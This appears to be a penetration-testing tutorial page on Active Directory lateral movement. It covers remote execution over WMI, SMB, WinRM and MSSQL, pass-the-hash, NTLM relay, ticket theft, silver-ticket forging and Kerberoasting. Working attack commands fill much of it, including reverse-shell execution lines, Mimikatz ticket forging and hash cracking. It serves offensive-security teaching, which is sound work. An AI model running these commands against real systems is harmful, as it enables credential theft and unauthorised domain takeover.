---
description: Moving between computers by re-using accounts to get more access
---

# Lateral Movement

## Protocols

Some protocols allow running commands as a user on the computer when having valid credentials. This is useful because often different computers will contain different new secrets to escalate further into the domain, and eventually reach the Domain Admin.

### WMI (135)

The Windows Management Instrumentation (WMI) protocol works over port 135 and is used commonly for automating tasks. This is also useful for lateral movement, however, because it allows us to remotely run commands on another computer as a user:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\> wmic /node:$IP /user:$USERNAME /password:$PASSWORD process call create "calc"
</strong>Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 742;
        ReturnValue = 0;
};
</code></pre>

The above method needs to be done from a PowerShell console on an already-compromised machine, but [NetExec](https://github.com/Pennyw0rth/NetExec) can also send commands through this protocol, and even pass the hash. Simply use the syntax you're used to with `-u` and `-p`, and use `-x` to specify the command to execute (such as a reverse shell):

```bash
nxc wmi $IP -u $USERNAME -p $PASSWORD -x 'powershell -e ...'
```

### SMB - PsExec (139, 445)

[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is part of Microsoft's Sysinternals suite and is made to easily run commands on a remote machine through an interactive console. The `.exe` provided implements the following steps on SMB:

1. Write `psexesvc.exe` to the `ADMIN$` share which maps to the `C:\Windows` directory
2. Create a service from this binary that can take commands
3. Run any incoming authenticated commands through this service

It can target any host where the user has local administrator privileges to be able to do the above actions. Using the official `PsExec.exe` a session can be started as follows:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> .\PsExec64.exe -i \\$IP -u $DOMAIN\$USERNAME -p $PASSWORD powershell
</strong>
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

<strong>PS C:\Windows\system32> whoami
</strong>$DOMAIN\$USERNAME
</code></pre>

[NetExec](https://github.com/Pennyw0rth/NetExec) implements a similar idea called `smbexec` which also drops an executable on the machine and executes it remotely. This also instantly gives you the `nt authority\system` permissions:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ nxc smb $IP -u $USERNAME -p $PASSWORD --exec-method smbexec -x 'whoami'
</strong>SMB         192.168.198.73  445    FILES04          [*] Windows 10.0 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.198.73  445    FILES04          [+] corp.com\jen:Nexus123! (Pwn3d!)
SMB         192.168.198.73  445    FILES04          [+] Executed command via smbexec
<strong>SMB         192.168.198.73  445    FILES04          nt authority\system
</strong></code></pre>

This implementation is not exactly the same however, an alternative is [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py) from impacket to get an interactive shell:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ psexec.py '$USERNAME:$PASSWORD@$IP'
</strong>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on $IP.....
[*] Found writable share ADMIN$
[*] Uploading file YUqMJypj.exe
[*] Opening SVCManager on $IP.....
[*] Creating service yddV on $IP.....
[*] Starting service yddV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

<strong>C:\Windows\system32> whoami
</strong>nt authority\system
</code></pre>

### WinRM (5985)

If your user is inside of the **"Remote Management Users**" group, this may be an option.&#x20;

Windows Remote Management (WinRM) is another protocol built to execute commands remotely, this time allowing an interactive shell to be started as well. The commands are a little more complex in PowerShell, but we generate a password credential and start a session with that remotely:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PS C:\> $secureString = ConvertTo-SecureString $PASSWORD -AsPlaintext -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $USERNAME, $secureString;

# Run a single command
PS C:\> $Options = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName $IP -Credential $credential -SessionOption $Options
<strong>PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine ="calc"};
</strong>
# Start an interactive shell
<strong>PS C:\> New-PSSession -ComputerName $IP -Credential $credential
</strong>PS C:\> Enter-PSSession 1
[$IP]: PS C:\> whoami
$DOMAIN\$USERNAME
</code></pre>

[NetExec](https://github.com/Pennyw0rth/NetExec) can also run commands to start a reverse-shell for example, if you don't have access to a compromised PowerShell shell. This is very similar to the WMI command:

```
nxc winrm $IP -u $USERNAME -p $PASSWORD -x 'powershell -e ...'
```

Lastly, there is the purpose-built `evil-winrm` tool that can start an interactive session remotely. It also supports extra commands in the shell like uploading/downloading and starting the connection using pass-the-hash or a private key certificate:

{% embed url="https://github.com/Hackplayers/evil-winrm" %}
Interactive WinRM shell with many useful extra features
{% endembed %}

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ evil-winrm -i $IP -u $USERNAME -p $PASSWORD
</strong>
Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

<strong>*Evil-WinRM* PS C:\> 
</strong></code></pre>

Read '[Basic Commands](https://github.com/Hackplayers/evil-winrm?tab=readme-ov-file#basic-commands)' to learn about the extra built-in commands like uploading/downloading, loading assemblies, and [#amsi-bypass](antivirus-evasion.md#amsi-bypass "mention") all from inside the shell.

### RDP (3389)

Remote Desktop Protocol is used very often by administrators and clients to use their Windows machine and configure it visually. When a user is in the "**Remote Desktop Users**" group, they can use this protocol on port 3389 to connect. There is no CLI-only option for this, only GUI.

_Linux_ has a tool called [Remmina](https://remmina.org/) that you can add hosts to, and connect to via RDP.

_Windows_ has this built-in with "Remote Desktop Connection" (mstsc.exe), which often works better because it is the official client, and supports copy-pasting across machines for example.

{% hint style="info" %}
**Tip**: Getting the domain correct can be a bit finicky, so try using [NetExec](https://github.com/Pennyw0rth/NetExec) with SMB to get it:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ nxc smb $IP -u $USERNAME -p $PASSWORD
</strong>SMB      $IP 445    MS01             [+] $DOMAIN\$USERNAME:$PASSWORD
</code></pre>
{% endhint %}

### SSH (22)

It might sound a bit unusual, but Windows machines can also host OpenSSH servers that allow you to connect via a terminal. These also don't require the user to be in any special group like [#winrm](lateral-movement.md#winrm "mention") or [#rdp](lateral-movement.md#rdp "mention"), so any user can log in with this. It simply requires a username and password:

```bash
sshpass -p $PASSWORD ssh $USERNAME@$IP
```

Shells like these are also very nice to work with, having command history and working arrow keys, as well as fast responses and flawless interactivity with programs you start.&#x20;

### MSSQL (1433)

Microsoft has its own Database and SQL protocol called MSSQL, hosted on SQL Server. You may encounter this in a [sql-injection.md](../web/sql-injection.md "mention") attack as well, but when inside the network you may also be able to directly authenticate and connect to it.

An interesting exploitable command is `xp_cmdshell` which runs a shell command from an SQL query. Because this is dangerous, this feature first needs to be enabled and then only permitted users can run it. But if you compromise a database administrator with enough privileges, they can enable and abuse this feature to get code execution on the SQL server:

<pre class="language-sql"><code class="lang-sql"># Enable option to enable 'xp_cmdshell' later
<strong>sp_configure 'show advanced options', '1'
</strong><strong>RECONFIGURE
</strong># Enable executing xp_cmdshell
<strong>sp_configure 'xp_cmdshell', '1'
</strong><strong>RECONFIGURE
</strong># Execute a command with xp_cmdshell as a database administrator
<strong>EXEC master..xp_cmdshell 'whoami'
</strong></code></pre>

This process can also be automated using [NetExec](https://github.com/Pennyw0rth/NetExec) which implements this in the `nxc mssql -x` module. By providing an administrator like the SQL service account itself, for example:

```bash
nxc mssql $IP -u sql_svc -p $PASSWORD --local-auth -x 'whoami'
```

For a simple SQL client connection instead, if you have lower privileges for example, check out [mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from Impacket. This can connect to an SQL Server with any credentials, and then you can manually query the database to do whatever you need in an MSSQL console.&#x20;

```bash
mssqlclient.py '$DOMAIN/sql_svc:$PASSWORD@$IP' -windows-auth
```

## Pass the Hash

In Active Directory, having the NTLM hash of a user is **just as good as having their password**. This is due to the pass-the-hash attack where all verification uses the hash instead of the password (as seen in the [#authentication-flow](lateral-movement.md#authentication-flow "mention")). Most offensive tools allow a `-hashes` or `-H` argument to pass the hash and impersonate a user without knowing their password.&#x20;

NTLM Authentication won't send the plain NTLM hashes over the network, ever. It only calculates a challenge-response using it which cannot be reversed, only brute-forced. Using a challenge-response an attacker can still guess passwords and calculate the hash as well as the response offline.&#x20;

### Pass the Challenge (NTLM Relay)

It is recommended to read [#forcing-authentication-to-relay](exploitation.md#forcing-authentication-to-relay "mention") first to understand where challenges can come from, and how we can trigger them.

One common exploit on domain-joined Windows servers is that when **connecting to an SMB share**, they will answer any authentication requests. The NetNTML challenge-response mechanism allows the attacker to be in between the victim, and the target server. When the client connects to the attacker, the attacker can ask a different server for a challenge as well, and then **relay** that challenge back to the client. The client will then solve that challenge, and send it back to the attacker, who can finally send the correct response to the target server. This authenticates them as the victim!

<figure><img src="../.gitbook/assets/image (2) (2).png" alt=""><figcaption><p>Relaying an NTLM authentication flow to impersonate a user (<a href="https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/">source</a>)</p></figcaption></figure>

Because many services accept NTLM authentication in this way, most commonly SMB and LDAP. A tool was developed that can listen for authentication requests, and relay them to a target server like explained. Because the protocol is so simple, this can go cross-service meaning an SMB request could be relayed to LDAP.&#x20;

{% embed url="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py" %}
Relay NTLM challenges to different services automatically ([more info](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/))
{% endembed %}

Letting it listen with `sudo ntlmrelayx.py` a bunch of ports will be opened for connections. Try ways of [#forcing-authentication-to-relay](exploitation.md#forcing-authentication-to-relay "mention"), and when you do, the tool will automatically relay the authentication to a target specified with `-t` and a protocol:

* `-t $IP`: SMB (default)
* `-t imap://$IP`: IMAP
* `-t ldaps://$IP`: LDAP

Another useful option is `-i` which will spawn a listener on every success for interactive tooling like  SMB or LDAP client where you can write commands yourself. \
By default, the tool will perform useful actions like trying to execute files through SMB, or even adding a Domain Admin account if enough privileges are gained.&#x20;

With the `-c` argument you can specify a custom command that it will execute if it is a local admin, otherwise, it dumps the SAM hashes in memory by default. Using `-t` as shown above you specify a single target, and `-tf` specifies a target file containing all addresses it should try to relay to:

```bash
sudo ntlmrelayx.py --no-http-server -smb2support -t 10.10.10.10 -c 'powershell -e ...'
sudo ntlmrelayx.py --no-http-server -smb2support -tf ips.txt
```

### Overpass the Hash

The above pass-the-hash technique works great for protocols like SMB which use the legacy NTLM authentication, but newer Kerberos authentication schemes like for HTTP don't seem vulnerable at first. That is where "Overpass the Hash" comes in where we **turn an NTLM hash into a valid Kerberos ticket**. This turns out to be very simple using Mimikatz:

{% code overflow="wrap" %}
```powershell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
{% endcode %}

The above will start a new `powershell.exe` process in a new window, which is useful in a visual RDP connection, but often you'll want to execute a reverse shell instead, like from [#msfvenom-.exe](exploitation.md#msfvenom-.exe "mention").

### Pass the Ticket

When having reached [#post-exploitation-mimikatz](local-privilege-escalation.md#post-exploitation-mimikatz "mention"), Kerberos tickets may be found in memory, which you can check and export to the current directory using `sekurlsa::tickets /export`.

This will generate many files with the following format:\
`[0;12bd0]-0-0-40810000-$USERNAME@$PROTOCOL-$COMPUTER.kirbi`\
where the username, protocol, and computer are filled in with some place the user tried to access. The protocol `cifs` is just SMB in this case, meaning a file share was accessed. We can import these tickets into our current session to get the same privileges that they had:

{% code title="Importing the ticket" %}
```bash
kerberos::ptt [0;12bd0]-0-0-40810000-$USERNAME@cifs-$COMPUTER.kirbi
```
{% endcode %}

Closing `mimikatz.exe`, the `klist` command should now show this injected ticket:

<pre class="language-powershell" data-title="Verifying the import"><code class="lang-powershell"><strong>PS C:\> klist
</strong>
Cached Tickets: (1)

<strong>#0>     Client: $USERNAME @ $DOMAIN
</strong><strong>        Server: cifs/$COMPUTER @ $DOMAIN
</strong>        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

<strong>PS C:\> ls \\$COMPUTER\share
</strong>
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----                                       100 secret.txt
</code></pre>

Another powerful thing we can access through SMB if the user has local administrator rights there is [#psexec-smb](lateral-movement.md#psexec-smb "mention"). This will get us a full system shell on that system, but be careful that you use the HOSTNAME instead of the IP address! Otherwise, it will force an NTLM authentication:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> .\PsExec.exe \\dc01 powershell
</strong>PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

<strong>C:\Windows\system32>
</strong>
# With IP address, Kerberos tickets aren't used:
<strong>PS C:\> .\PsExec.exe \\10.10.10.10 powershell
</strong>PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 10.10.10.10:
<strong>Access is denied.
</strong></code></pre>

### Forge (Silver) Tickets

All service accounts like a webserver have a Service Principal Name (SPN), which we abuse more in [#kerberoasting](lateral-movement.md#kerberoasting "mention"). But if through [#post-exploitation-mimikatz](local-privilege-escalation.md#post-exploitation-mimikatz "mention"), for example, we find the NTLM hash of an SPN, we can go one step further. With this secret known, we can forge a Kerberos ticket for **any user** to the service! This works because this hash normally verifies the integrity, but now it is known and can be used to break the trust.&#x20;

`mimikatz.exe` can best be used to craft such tickets and inject them into the current session. For this we need to supply a few pieces of information:

1. `/domain`: regular domain name.\
   (eg. `corp.com`)
2. `/sid`: **S**ecurity **Id**entifier of the _domain_, easily found using `whoami /user` and trimming the last number. [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) also has a `ConvertTo-SID '$DOMAIN\$USER'` function. \
   (eg. `S-1-5-21-5386719015-7638691639-2457330780`)
3. `/target`: Domain name of the service.\
   (eg. `web01.corp.com`)
4. `/service`: Type of the service, one of `cifs` (SMB), `rpcss`, `http`, `mssql`.\
   (eg. `http`)
5. `/rc4`: NTLM hash of the SPN you are targeting.\
   (eg. `4d28cf5252d39971419580a51484ca09`)
6. `/user`: Username of who to create the ticket for, which will decide your access.\
   (eg. `admin`)

{% code title="Mimikatz command" overflow="wrap" %}
```powershell
kerberos::golden /ptt /domain:corp.com /sid:S-1-5-21-5386719015-7638691639-2457330780 /target:web01.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:admin
```
{% endcode %}

After executing this command and closing Mimikatz, you should see the new forged ticket in `klist`. This can now be used on the webserver for example by invoking a request with the current credentials:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> iwr -UseDefaultCredentials http://web01
</strong>
StatusCode        : 200
StatusDescription : OK
Content           : ...
</code></pre>

## Kerberoasting

{% content-ref url="windows-authentication/kerberos.md" %}
[kerberos.md](windows-authentication/kerberos.md)
{% endcontent-ref %}

Every **Service** on AD that requires Kerberos authentication registers a **Service Principal Name** (SPN). This allows clients to request Tickets for the service. The Ticket Granting Ticket (TGT) is encrypted using the **service account's password hash**, which is given to the client. Using this encrypted data, an attacker can brute force the password offline until it successfully decrypts, then knowing the correct password for the service account.

1. Query the AD to identify service accounts with registered SPNs (eg. using [Broken link](broken-reference "mention"))
2. Request a Ticket Granting Service (TGS) ticket for the identified service account using any compromised user. In response, receive the encrypted TGS with the password hash
3. Attempt to crack the password hash offline, and when found, take over the service account

The first step can be done easily in BloodHound under the **Analysis** tab as **List all Kerberoastable Accounts**. \
After which, you can use [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) from impacket to request a ticket and receive the crackable password hash.

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ GetUserSPNs.py 'DOMAIN.COM/USER:PASSWORD' -request -outputfile kerberoast.hashes -dc-ip $DC
</strong>...
$krb5tgs$23$*user$realm$test/spn*$63386d22d359fe42230300d56852c9eb$891ad31...b668c5ed
</code></pre>

These can then be cracked offline with tools like [#hashcat](../cryptography/hashing/cracking-hashes.md#hashcat "mention"):

```bash
hashcat -m 13100 kerberoast.hashes /list/rockyou.txt
```

{% hint style="info" %}
**Note**: Complete domain credentials are not required for this attack to work. [ntlm.md](windows-authentication/ntlm.md "mention") hashes (using `-H`) or even for accounts vulnerable to [#asreproasting](lateral-movement.md#asreproasting "mention") ([reference](https://github.com/fortra/impacket/pull/1413))
{% endhint %}

### ASREPRoasting

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/asreproast" %}
Abusing accounts without pre-authentication to receive hashes crackable offline
{% endembed %}

This attack can be done by speaking to the domain controller, not even a valid account is needed. You can use a list of users you found to check if they are vulnerable even without authenticating. But authentication allows you to query the LDAP server to get every existing user for sure:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Using a list of users (no authentication)
<strong>GetNPUsers.py -request -format hashcat -outputfile asreproast.hashes -dc-ip $DC -usersfile users.txt '$DOMAIN/'
</strong># With authentication by querying
<strong>GetNPUsers.py -request -format hashcat -outputfile asreproast.hashes -dc-ip $DC '$DOMAIN/$USERNAME:$PASSWORD'
</strong></code></pre>

Hashes resulting from this attack can then be cracked using [#hashcat](../cryptography/hashing/cracking-hashes.md#hashcat "mention"):

```bash
hashcat -m 18200 asreproast.hashes /list/rockyou.txt
```
